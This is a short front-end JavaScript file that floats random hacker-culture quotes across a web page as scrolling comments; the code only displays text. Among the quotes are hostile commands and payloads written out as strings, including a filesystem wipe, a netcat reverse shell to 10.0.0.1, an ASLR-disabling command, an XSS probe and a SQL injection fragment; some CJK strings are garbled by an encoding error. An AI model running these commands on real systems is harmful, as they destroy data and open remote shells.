(function() {
  const container = document.getElementById('danmaku-container');
  if (!container) return;

  const quotes = [
    'Talk is cheap, show me the code.',
    'Pwn the world.',
    'system("/bin/sh")',
    'GROMACS running...',
    'Ciallo锝?鈭犮兓蠅< )鈱掆槄',
    'Warning: Stack Smashing Detected',
    'Segmentation fault (core dumped)',
    'rm -rf / --no-preserve-root',
    'id > /tmp/pwned',
    'nc -e /bin/sh 10.0.0.1 4444',
    'ROP chain is coming...',
    'NOP sled incoming.',
    "I'm in.",
    'echo 0 > /proc/sys/kernel/randomize_va_space',
    'BUFSIZ is never enough.',
    'El Psy Kongroo.',
    '绉併€佹皸銇仾銈娿伨銇欙紒',
    '銇撱亾銇銇牁鍩熴仹銇欍€?',
    'heap spray in 3... 2... 1...',
    'Connection reset by peer.',
    '0xdeadbeef',
    '41414141',
    'turtle all the way down.',
    'exploit/multi/handler ready.',
    'shellcode injected.',
    '<script>alert(1)</script>',
    'DROP TABLE users;--',
    "It's not a bug, it's a feature.",
    'Hello, World.',
    'while true; do echo pwn; done',
    'The quieter you become, the more you can hear.',
  ];

  function shootDanmaku() {
    const text = quotes[Math.floor(Math.random() * quotes.length)];
    const span = document.createElement('span');
    span.className = 'danmaku-item';
    span.textContent = text;

    const top = 10 + Math.random() * 80;
    const duration = 10 + Math.random() * 10;

    span.style.top = top + '%';
    span.style.animation = 'danmakuFloat ' + duration + 's linear forwards';

    container.appendChild(span);

    setTimeout(function() {
      if (span.parentNode) span.parentNode.removeChild(span);
    }, duration * 1000 + 200);
  }

  shootDanmaku();
  setInterval(shootDanmaku, 2500);
})();
